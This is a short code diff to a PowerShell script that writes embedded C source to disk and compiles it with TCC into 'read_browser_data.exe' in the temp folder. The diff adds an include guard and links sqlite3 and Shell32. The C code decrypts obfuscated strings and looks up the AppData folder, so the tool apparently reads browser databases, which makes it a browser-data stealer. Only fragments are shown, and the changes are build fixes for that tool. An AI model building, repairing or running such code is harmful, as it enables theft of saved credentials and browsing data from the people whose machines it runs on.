@@ -27,7 +27,9 @@ $cCode = @'
 #include <windows.h>
 #include <shlobj.h> // Include this header for SHGetFolderPathA and CSIDL_APPDATA
 
+#ifndef _WIN32_WINNT
 #define _WIN32_WINNT 0x0500 // Define this to use SHGetFolderPathA
+#endif
 
 void decrypt(char *str) {
     while (*str) {
@@ -151,7 +153,7 @@ Set-Content -Path $cFilePath -Value $cCode
 
 # Compile the C code using TCC
 Write-Output "Compiling the C code..."
-tcc -o "$env:TEMP\read_browser_data.exe" $cFilePath
+tcc -o "$env:TEMP\read_browser_data.exe" $cFilePath -lsqlite3 -lShell32
 
 Write-Output "Compilation completed successfully!"
 
